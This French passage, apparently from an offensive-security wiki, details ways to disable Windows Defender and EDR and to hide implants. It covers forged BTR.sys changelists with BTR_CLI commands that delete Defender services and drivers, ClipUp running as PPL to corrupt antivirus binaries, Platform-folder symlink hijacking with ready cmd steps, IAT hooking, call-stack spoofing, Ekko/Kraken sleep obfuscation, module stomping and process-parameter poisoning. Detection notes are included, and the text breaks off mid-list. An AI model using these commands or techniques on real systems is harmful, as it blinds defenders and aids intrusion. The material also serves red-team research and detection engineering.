Defender dépose normalement la ressource sous forme de fichier aléatoire `[a-z]{8}.sys` et enregistre un service noyau portant un nom similaire. `DriverEntry` lit la valeur `Args` du service, ouvre l’ADS NTFS indiqué, déchiffre et valide la liste d’actions, écrit les commentaires, puis renvoie `0xC0000056` (`STATUS_DELETE_PENDING`) après une exécution réussie, afin que le pilote soit déchargé au lieu de rester résident. Un service falsifié présente les valeurs caractéristiques suivantes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Le flux `:changelist` contient un blob chiffré avec RC4. Les builds analysés réutilisent une clé fixe de 256 octets : le chiffrement ne constitue donc pas une frontière d’autorisation. Un plaintext valide comporte un en-tête global de 24 octets (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC d’en-tête et ID de transaction dérivé du payload), suivi d’un chemin de feedback UTF-16 terminé par un caractère nul et d’un nombre quelconque d’éléments. Chaque élément possède un en-tête de 16 octets (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), suivi de données propres à l’action et se terminant par **exactement quatre octets NUL**. Chaque région d’en-tête et de données est vérifiée indépendamment avec le polynôme CRC-32 `0xEDB88320`, un état initial `0xFFFFFFFF` et **sans XOR final** (`~CRC32`) ; l’état CRC est réinitialisé pour chaque région.<sup>[[36]](#references)[[37]](#references)</sup>

Les ID d’action acceptés exposent ces primitives du noyau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Données de l’élément | Résultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Supprimer un fichier, même verrouillé |
| 2 | `[UTF-16 path]` | Supprimer un répertoire vide |
| 3 | `[Flags][source][destination]` | Déplacer un fichier vers un chemin protégé choisi par l’attaquant ; une destination vide signifie supprimer |
| 4 | `[Flags][key path]` | Supprimer récursivement une clé de registre |
| 5 | `[Flags][key path + "\\" + value]` | Supprimer une valeur de registre |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Créer/mettre à jour une valeur de registre et créer les chemins de clé manquants |

Pour les actions 5 et 6, le séparateur clé/valeur sur le fil est constitué de **deux barres obliques inverses consécutives** ; un chemin formaté selon les conventions habituelles ne sera pas séparé correctement. Le fichier de feedback reprend en grande partie la requête, mais les quatre premiers octets de données de chaque élément deviennent son `NTSTATUS` de résultat. Pour les actions 1 et 2, qui ne comportent pas de champ de flags initial, BTR déplace le chemin dans les quatre octets réservés de fin afin de libérer l’espace nécessaire à ce statut.<sup>[[36]](#references)</sup>

### Workflow `BTR_CLI` et fenêtre de démarrage précoce

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) met en œuvre la chaîne complète : extraire `BTR.sys` de Defender local, créer `<random>.sys:changelist` et un flux de feedback, sérialiser, vérifier les sommes de contrôle et chiffrer les actions chaînées, créer directement la clé de registre du service, puis appeler `NtLoadDriver` pour `-trigger now` ou le laisser en tant que pilote démarré par le système avec `-trigger boot`. La préparation directe du registre évite le chemin SCM normal `CreateServiceW` et ne génère donc **pas** l’événement d’installation de service ID 7045. Les artefacts déclenchés au démarrage peuvent ensuite être supprimés avec `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` n’est pas utilisable, car BTR effectue des opérations d’E/S sur les fichiers depuis `DriverEntry`, avant que la pile de stockage et le lien `SystemRoot` soient prêts. `Start=1`, associé au groupe prioritaire `Boot Bus Extender`, s’exécute plutôt en Phase 1 : NTFS est utilisable, mais de nombreux pilotes de sécurité démarrés avec le système et services EDR en mode utilisateur ne sont pas encore initialisés. Les filtres démarrés au boot, comme `WdFilter`, peuvent déjà être chargés, mais BTR peut supprimer leurs binaires ou leur configuration de service avant le démarrage suivant, et supprimer les exécutables des services avant que SCM ne les lance. ELAM ne comble pas cette faille, car BTR s’exécute après l’évaluation au démarrage et possède une signature Microsoft valide.<sup>[[36]](#references)</sup>

Plusieurs actions s’exécutent dans une seule transaction. Le PoC ajoute en tête l’Action 1 pour le chemin codé en dur `\SystemRoot\Temp\BootClean.log` : BTR crée ce journal, puis traite sa propre demande de suppression et le supprime avant de se décharger. Cela réduit les traces, tandis que le fait de placer le retour d’information dans `<random>.sys:<random>.dat` permet de supprimer ensemble le pilote et les deux flux.<sup>[[36]](#references)[[37]](#references)</sup>

### Corrélations de détection à fort signal

Les règles fondées uniquement sur les signatures et la liste de blocage des pilotes vulnérables de Microsoft ne permettent pas de contrer l’abus des fonctionnalités prévues de BTR. Privilégiez les corrélations comportementales suivantes, en distinguant la chaîne de provenance légitime de Defender d’un lanceur quelconque.<sup>[[36]](#references)</sup>

- **Sysmon 15 :** la création de `.sys:changelist` est systématique lors de la préparation de BTR. Un ADS `.dat` associé au même `.sys` est particulièrement suspect, car Defender place normalement ses retours d’information dans `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sans System 7045 :** corrélez la création directe de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenant `Args=...:changelist` et `Group=Boot Bus Extender` avec l’absence d’événement d’installation SCM correspondant.
- **Sysmon 6 -> 23 :** corrélez le chargement d’un pilote BTR connu provenant d’une chaîne de provenance autre que Defender avec la suppression ultérieure de fichiers attribuée à `System`/PID 4, en particulier s’il s’agit de binaires de sécurité.
- **Sysmon 11 -> 23 :** déclenchez une alerte en cas de création et de suppression rapides de `\SystemRoot\Temp\BootClean.log` par `System`/PID 4.
- Restreignez et auditez l’attribution et l’activation de `SeLoadDriverPrivilege` ; une signature Microsoft ne suffit pas à garantir la confiance lorsqu’un pilote d’outil de sécurité est préparé par `cmd.exe`, PowerShell ou un processus inconnu.

## Abus de Protected Process Light (PPL) pour altérer un antivirus/EDR avec des LOLBINs

Protected Process Light (PPL) applique une hiérarchie de signataires et de niveaux afin que seuls les processus protégés de niveau égal ou supérieur puissent s’altérer mutuellement. Du point de vue offensif, si vous pouvez lancer légitimement un binaire compatible avec PPL et contrôler ses arguments, vous pouvez détourner une fonctionnalité bénigne (par exemple, la journalisation) pour en faire une primitive d’écriture limitée, protégée par PPL, visant les répertoires protégés utilisés par les antivirus/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Ce qui permet à un processus de s’exécuter en tant que PPL
- L’EXE cible (et toutes les DLL chargées) doit être signé avec un EKU compatible avec PPL.
- Le processus doit être créé avec CreateProcess à l’aide des indicateurs : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible correspondant au signataire du binaire doit être demandé (par exemple, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Un niveau incorrect entraînera l’échec de la création.

Voir également cette introduction plus générale à PP/PPL et à la protection de LSASS :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Outil d’aide open source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l’EXE cible) :
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Modèle d’utilisation :

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitive LOLBIN : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier journal à un chemin spécifié par l’appelant.
- Lorsqu’il est lancé en tant que processus PPL, l’écriture du fichier est effectuée avec les privilèges PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

Aides pour les chemins courts 8.3
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Déduire le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chaîne d’exploitation (abstraite)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` à l’aide d’un lanceur (par ex. CreateProcessAsPPL).
2) Fournir l’argument de chemin du journal de ClipUp pour forcer la création d’un fichier dans un répertoire AV protégé (par ex. Defender Platform). Utilisez des noms courts 8.3 si nécessaire.
3) Si l’AV ouvre/verrouille normalement le binaire cible pendant son exécution (par ex. MsMpEng.exe), planifier l’écriture au démarrage, avant le lancement de l’AV, en installant un service à démarrage automatique qui s’exécute de manière fiable plus tôt. Vérifier l’ordre de démarrage avec Process Monitor (journalisation du démarrage).
4) Au redémarrage, l’écriture avec les privilèges PPL a lieu avant que l’AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Exemple d’invocation (chemins masqués/raccourcis par sécurité) :

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes et contraintes
- Vous ne pouvez pas contrôler le contenu écrit par ClipUp, seulement son emplacement ; cette primitive convient à la corruption plutôt qu’à l’injection précise de contenu.
- Nécessite des privilèges d’administrateur local/SYSTEM pour installer/démarrer un service, ainsi qu’une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; une exécution au démarrage évite les verrous de fichiers.

Détections
- Création du processus `ClipUp.exe` avec des arguments inhabituels, en particulier lorsque son parent est un lanceur non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Enquêtez sur la création ou la modification de services précédant les échecs de démarrage de Defender.
- Surveillance de l’intégrité des fichiers binaires et des répertoires Platform de Defender ; créations/modifications inattendues de fichiers par des processus ayant des indicateurs de processus protégé.
- Télémétrie ETW/EDR : recherchez les processus créés avec `CREATE_PROTECTED_PROCESS` et l’utilisation anormale de niveaux PPL par des binaires autres que ceux d’AV.

Mesures d’atténuation
- WDAC/Code Integrity : limitez les binaires signés autorisés à s’exécuter en tant que PPL et les processus parents autorisés ; bloquez l’invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : limitez la création/modification des services à démarrage automatique et surveillez la manipulation de l’ordre de démarrage.
- Assurez-vous que la protection contre les altérations de Defender et les protections de démarrage anticipé sont activées ; enquêtez sur les erreurs de démarrage indiquant une corruption de binaires.
- Envisagez de désactiver la génération de noms courts 8.3 sur les volumes hébergeant les outils de sécurité, si cela est compatible avec votre environnement (testez minutieusement).

## Altération de Microsoft Defender via le détournement de lien symbolique du dossier Platform

Windows Defender choisit la plateforme à partir de laquelle il s’exécute en énumérant les sous-dossiers de :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier ayant la chaîne de version lexicographiquement la plus élevée (par ex. `4.18.25070.5-0`), puis démarre les processus du service Defender depuis ce dossier (en mettant à jour les chemins du service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux points de réanalyse de répertoire (liens symboliques). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin accessible en écriture par un attaquant et réaliser un DLL sideloading ou perturber le service.<sup>[[21]](#references)[[22]](#references)</sup>

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/liens symboliques dans le dossier Platform)
- Possibilité de redémarrer ou de déclencher une nouvelle sélection de plateforme par Defender (redémarrage du service au démarrage)
- Outils intégrés uniquement requis (`mklink`)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de plateforme fait confiance aux entrées de répertoire et choisit la version lexicographiquement la plus élevée sans vérifier que la cible pointe vers un chemin protégé/de confiance.

Étapes (exemple)
1) Préparez un clone accessible en écriture du dossier de plateforme actuel, par ex. `C:\TMP\AV` :
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez dans Platform un lien symbolique vers un répertoire portant un numéro de version supérieur et pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` ainsi que la configuration du service/du registre reflétant cet emplacement.

Options de post-exploitation
- DLL sideloading/code execution : Déposez/remplacez des DLL que Defender charge depuis son répertoire d’application afin d’exécuter du code dans les processus de Defender. Voir la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arrêt du service/déni de service : Supprimez le lien symbolique de version afin qu’au prochain démarrage, le chemin configuré ne soit plus résolu et que Defender ne démarre pas :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Notez que cette technique ne permet pas à elle seule une élévation de privilèges ; elle nécessite des droits d’administrateur.

## API/IAT Hooking + Call-Stack Spoofing avec PIC (style Crystal Kit)

Les red teams peuvent déplacer l’évasion à l’exécution de l’implant C2 vers le module cible lui-même en hookant sa Import Address Table (IAT) et en redirigeant des API sélectionnées vers du code indépendant de la position (PIC) contrôlé par l’attaquant. Cette approche généralise l’évasion au-delà de la petite surface d’API exposée par de nombreux kits (p. ex., CreateProcessA) et étend les mêmes protections aux BOF et aux DLL de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approche générale
- Charger un blob PIC à côté du module cible à l’aide d’un chargeur réflexif (préfixé ou compagnon). Le PIC doit être autonome et indépendant de la position.
- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et patcher les entrées IAT des imports ciblés (p. ex., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) pour qu’elles pointent vers des wrappers PIC légers.
- Chaque wrapper PIC exécute des techniques d’évasion avant d’effectuer un tail-call vers l’adresse de l’API réelle. Les techniques courantes incluent :
  - Masquer/démasquer la mémoire autour de l’appel (p. ex., chiffrer les régions du beacon, passer de RWX à RX, modifier les noms/autorisations des pages), puis restaurer l’état après l’appel.
  - Call-stack spoofing : construire une pile légitime et effectuer une transition vers l’API cible afin que l’analyse de la pile d’appels retrouve les frames attendues.<sup>[[9]](#references)</sup>
- Pour assurer la compatibilité, exporter une interface permettant à un script Aggressor (ou équivalent) d’enregistrer les API à hooker pour Beacon, les BOF et les DLL de post-exploitation.

Pourquoi utiliser l’IAT hooking ici
- Fonctionne avec tout code qui utilise l’import hooké, sans modifier le code de l’outil ni dépendre de Beacon pour proxifier des API spécifiques.
- Couvre les DLL de post-exploitation : hooker LoadLibrary* permet d’intercepter les chargements de modules (p. ex., System.Management.Automation.dll, clr.dll) et d’appliquer les mêmes techniques de masquage et d’évasion de la pile à leurs appels d’API.
- Rétablit l’utilisation fiable des commandes de post-exploitation qui créent des processus face aux détections fondées sur la pile d’appels, en wrappant CreateProcessA/W.

Exemple minimal d’IAT hook (pseudo-code x64 en C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l’import. Les loaders réflexifs comme TitanLdr/AceLdr illustrent le hooking pendant le DllMain du module chargé.
- Gardez les wrappers petits et compatibles PIC ; résolvez la véritable API à partir de la valeur IAT d’origine capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages accessibles en écriture et exécutables.

Stub de spoofing de la pile d’appels
- Les stubs PIC de type Draugr construisent une fausse chaîne d’appels (adresses de retour dans des modules bénins), puis basculent vers la véritable API.
- Cela déjoue les détections qui s’attendent à des piles canoniques provenant de Beacon/BOFs pour les API sensibles.
- Combinez ces techniques avec le stack cutting/stack stitching afin d’atterrir dans les frames attendues avant le prologue de l’API.

Intégration opérationnelle
- Ajoutez le loader réflexif au début des DLL post-ex afin que le PIC et les hooks s’initialisent automatiquement au chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les API cibles afin que Beacon et les BOFs bénéficient de la même voie d’évasion en toute transparence, sans modification du code.

Détection et considérations DFIR
- Intégrité de l’IAT : entrées qui pointent vers des adresses ne faisant pas partie d’une image (heap/anonymes) ; vérification périodique des pointeurs d’import.
- Anomalies de pile : adresses de retour n’appartenant pas aux images chargées ; transitions abruptes vers du PIC ne faisant pas partie d’une image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du loader : écritures dans l’IAT depuis le processus ; activité précoce de DllMain qui modifie les thunks d’import ; régions RX inattendues créées au chargement.
- Évasion du chargement d’image : en cas de hooking de LoadLibrary*, surveillez les chargements suspects d’assemblies d’automatisation/CLR corrélés à des événements de masquage mémoire.

Éléments de base et exemples connexes
- Loaders réflexifs qui effectuent le patching de l’IAT au chargement (p. ex., TitanLdr, AceLdr)
- Hooks de masquage mémoire (p. ex., simplehook) et PIC de stack cutting (stackcutting)
- Stubs PIC de spoofing de la pile d’appels (p. ex., Draugr)


## Hooking de l’IAT au chargement + obfuscation du sommeil (Crystal Palace/PICO)

### Hooks IAT au chargement via un PICO résident

Si vous contrôlez un loader réflexif, vous pouvez effectuer le hooking des imports **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du loader par un résolveur personnalisé qui vérifie d’abord les hooks :<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Créez un **PICO résident** (objet PIC persistant) qui subsiste après la libération du PIC transitoire du loader.
- Exportez une fonction `setup_hooks()` qui remplace le résolveur d’imports du loader (p. ex., `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorez les imports par ordinal et utilisez une recherche de hooks basée sur le hash, comme `__resolve_hook(ror13hash(name))`. Si un hook existe, renvoyez-le ; sinon, déléguez au véritable `GetProcAddress`.
- Enregistrez les cibles des hooks au moment de l’édition de liens avec les entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide puisqu’il se trouve dans le PICO résident.

Cela permet une **redirection de l’IAT au chargement** sans patcher la section de code de la DLL chargée après son chargement.

### Forcer la présence d’imports interceptables lorsque la cible utilise le parcours du PEB

Les hooks au chargement ne se déclenchent que si la fonction figure réellement dans l’IAT de la cible. Si un module résout les API via un parcours du PEB et un hash (sans entrée d’import), forcez un véritable import afin que le chemin `ProcessImports()` du loader le prenne en compte :

- Remplacez la résolution des exports par hash (p. ex., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur émet une entrée IAT, ce qui permet l’interception lorsque le loader réflexif résout les imports.

### Obfuscation du sommeil/de l’inactivité de type Ekko sans patcher `Sleep()`

Au lieu de patcher `Sleep`, interceptez les **primitives réelles d’attente/IPC** utilisées par l’implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les longues attentes, enveloppez l’appel dans une chaîne d’obfuscation de type Ekko qui chiffre l’image en mémoire pendant l’inactivité :<sup>[[31]](#references)[[27]](#references)</sup>

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` préparées.
- Chaîne typique (x64) : définir l’image en `PAGE_READWRITE` → chiffrement RC4 via `advapi32!SystemFunction032` sur l’image mappée entière → effectuer l’attente bloquante → déchiffrement RC4 → **restaurer les permissions par section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un modèle de `CONTEXT` ; clonez-le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour appeler chaque étape.

Détail opérationnel : renvoyez « succès » pour les longues attentes (p. ex., `WAIT_OBJECT_0`) afin que l’appelant continue pendant que l’image est masquée. Cette méthode cache le module aux scanners pendant les périodes d’inactivité et évite la signature classique de `Sleep()` patché.

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- Utilisation de `advapi32!SystemFunction032` sur de grands tampons contigus de la taille d’une image.
- Appel à `VirtualProtect` sur une grande plage, suivi de la restauration personnalisée des permissions par section.

### Enregistrement CFG à l’exécution pour les gadgets d’obfuscation du sommeil

Sur les cibles avec CFG activé, le premier saut indirect vers un gadget au milieu d’une fonction, comme `jmp [rbx]` ou `jmp rdi`, provoque généralement un plantage du processus avec `STATUS_STACK_BUFFER_OVERRUN`, car le gadget ne figure pas dans les métadonnées CFG du module. Pour maintenir les chaînes de type Ekko/Kraken dans des processus renforcés :<sup>[[30]](#references)</sup>

- Enregistrez chaque destination indirecte utilisée par la chaîne avec `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` et des entrées `CFG_CALL_TARGET_VALID`.
- Pour les adresses situées dans des images chargées (`ntdll`, `kernel32`, `advapi32`), le `MEMORY_RANGE_ENTRY` doit commencer à la **base de l’image** et couvrir sa **taille complète**.
- Pour les régions mappées manuellement/PIC/stomped, utilisez plutôt la **base de l’allocation** et la taille de l’allocation.
- Marquez non seulement le gadget de dispatch, mais aussi les exports atteints indirectement (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, les appels système d’attente/d’événement) ainsi que toute section exécutable contrôlée par l’attaquant qui deviendra une cible indirecte.

Les chaînes de sommeil de type ROP/JOP passent ainsi de « ne fonctionne que dans les processus sans CFG » à un primitive réutilisable pour `explorer.exe`, les navigateurs, `svchost.exe` et d’autres processus compilés avec `/guard:cf`.

### Spoofing de pile compatible CET pour les threads en attente

Le remplacement complet de `CONTEXT` est bruyant et peut échouer sur les systèmes CET Shadow Stack, car un `Rip` usurpé doit toujours correspondre à la pile fantôme matérielle. Une méthode plus sûre de masquage pendant le sommeil consiste à :<sup>[[30]](#references)</sup>

- Choisir un autre thread du même processus et lire les limites de pile de son `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Sauvegarder le TEB/TIB réel du thread courant.
- Capturer le contexte réel du thread en attente avec `GetThreadContext`.
- Copier **uniquement** le `Rip` réel dans le contexte usurpé, en laissant intact l’état usurpé de `Rsp`/de la pile.
- Pendant la période de sommeil, copier le `NT_TIB` du thread usurpé dans le TEB courant afin que les outils de parcours de pile effectuent le déroulement dans une plage de pile légitime.
- Une fois l’attente terminée, restaurer le TIB d’origine et le contexte du thread.

Cette méthode conserve un pointeur d’instruction compatible CET tout en trompant les outils de parcours de pile EDR qui se fient aux métadonnées de pile du TEB pour valider le déroulement.

### Variante basée sur les APC : Kraken Mask

Si le dispatch par timer queue est trop reconnaissable, la même séquence de sommeil-chiffrement-spoofing-restauration peut être exécutée depuis un thread auxiliaire suspendu au moyen d’APC mis en file d’attente :<sup>[[27]](#references)</sup>

- Créez un thread auxiliaire avec `NtTestAlert` comme point d’entrée.
- Mettez en file d’attente des frames `CONTEXT`/APC préparées avec `NtQueueApcThread` et exécutez-les avec `NtAlertResumeThread`.
- Stockez l’état de la chaîne sur le heap plutôt que sur la pile auxiliaire afin d’éviter d’épuiser la pile de thread par défaut de 64 Ko.
- Utilisez `NtSignalAndWaitForSingleObject` pour signaler atomiquement l’événement de démarrage et bloquer.
- Suspendez le thread principal avant de restaurer le TIB/contexte (`NtSuspendThread` → restauration → `NtResumeThread`) afin de réduire la fenêtre de concurrence pendant laquelle un scanner pourrait détecter une pile partiellement restaurée.

Cette variante remplace la signature `CreateTimerQueueTimer` + `NtContinue` par une signature thread auxiliaire/APC, tout en conservant les mêmes objectifs de masquage RC4 et de spoofing de pile.

Idées de détection supplémentaires
- Appels à `NtSetInformationVirtualMemory` avec `VmCfgCallTargetInformation` juste avant des périodes de sommeil, des attentes ou le dispatch d’APC.
- Appels à `GetThreadContext`/`SetThreadContext` autour de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- Appels à `NtQueryInformationThread` suivis d’écritures directes dans les limites de pile TEB/TIB du thread courant.
- Chaînes `NtQueueApcThread`/`NtAlertResumeThread` qui atteignent indirectement `SystemFunction032`, `VirtualProtect` ou des fonctions auxiliaires de restauration des permissions de section.
- Utilisation répétée de signatures de gadgets courtes telles que `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) comme pivots de dispatch dans des modules signés.


## Module Stomping de précision

Le module stomping exécute des payloads depuis la **section `.text` d’une DLL déjà mappée dans le processus cible**, au lieu d’allouer une mémoire exécutable privée évidente ou de charger une nouvelle DLL sacrifiable. La cible de l’écrasement doit être une **image chargée adossée au disque**, dont l’espace de code peut accueillir le payload sans corrompre les chemins de code encore nécessaires au processus.<sup>[[1]](#references)[[2]](#references)</sup>

### Sélection fiable de la cible

Le stomping naïf de modules courants comme `uxtheme.dll` ou `comctl32.dll` est fragile : la DLL peut ne pas être chargée dans le processus distant, et une région de code trop petite peut faire planter le processus. Voici une méthode plus fiable :

1. Énumérez les modules du processus cible et conservez une **liste d’inclusion limitée aux noms** des DLL déjà chargées.
2. Construisez d’abord le payload et notez sa **taille exacte en octets**.
3. Parcourez les DLL candidates sur le disque et comparez la **`Misc_VirtualSize` de la section PE `.text`** à la taille du payload. Ce critère est plus important que la taille du fichier, car il reflète la taille de la section exécutable **une fois mappée en mémoire**.
4. Analysez l’**Export Address Table (EAT)** et choisissez le RVA d’une fonction exportée comme décalage de départ du stomping.
5. Calculez le **rayon d’impact** : si le payload dépasse les limites de la fonction sélectionnée, il écrasera les exports adjacents disposés après celle-ci en mémoire.

Exemples d’outils de reconnaissance/sélection observés dans la nature :

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Notes opérationnelles
- Préférez les DLL **déjà chargées** dans le processus distant afin d’éviter la télémétrie associée à `LoadLibrary` et aux chargements d’images inattendus.
- Préférez les exports rarement exécutés par l’application cible ; sinon, les chemins de code normaux peuvent atteindre les octets stompés avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de remplacer l’insertion du shellcode sous forme de littéral de chaîne par un **initialiseur entre accolades de tableau d’octets**, afin que le buffer complet soit correctement représenté dans le code source de l’injecteur.

Idées de détection
- Écritures distantes dans des pages exécutables adossées à une image (`MEM_IMAGE`, `PAGE_EXECUTE*`), plutôt que dans les allocations privées RWX/RX plus courantes.
- Points d’entrée d’export dont les octets en mémoire ne correspondent plus au fichier correspondant sur disque.
- Threads distants ou pivots de contexte dont l’exécution commence dans un export légitime d’une DLL dont les premiers octets ont été modifiés récemment.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` visant des pages `.text` de DLL, suivies de la création d’un thread.

## Empoisonnement des paramètres de processus (P3)

L’empoisonnement des paramètres de processus (P3) est une technique d’**injection de processus / d’évasion EDR** qui évite le chemin d’écriture distante classique (`VirtualAllocEx` + `WriteProcessMemory`). Au lieu de copier des octets dans une cible déjà en cours d’exécution, elle exploite le fait que Windows **copie certains paramètres de démarrage de `CreateProcessW` dans le processus enfant** et les stocke dans `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Données porteuses pouvant être empoisonnées et copiées par `CreateProcessW`

Les données porteuses utiles sont :

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (avec `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Contraintes pratiques des données porteuses :

- `lpCommandLine` doit pointer vers une **mémoire inscriptible** pour `CreateProcessW` et est limité à **32 767 caractères Unicode**, terminateur nul compris.
- `lpEnvironment` doit être un bloc d’environnement Unicode composé de chaînes successives `NAME=VALUE\0`, suivies d’un `\0` supplémentaire.
- `lpReserved` étant officiellement réservé, le mapping `ShellInfo` doit être considéré comme un détail d’implémentation plutôt que comme un contrat documenté stable.

La création normale d’un processus devient ainsi la **primitive de transfert de payload**. L’opérateur crée le processus enfant avec des données de démarrage contrôlées par l’attaquant et laisse Windows effectuer la copie entre processus.

### Flux de recherche distante sans API d’écriture distante

Après la création de l’enfant, recherchez le buffer copié à l’aide de primitives **en lecture seule** :

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtenir `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lire le `PEB` distant
3. Suivre `PEB.ProcessParameters`
4. Lire `RTL_USER_PROCESS_PARAMETERS`
5. Utiliser le pointeur sélectionné :
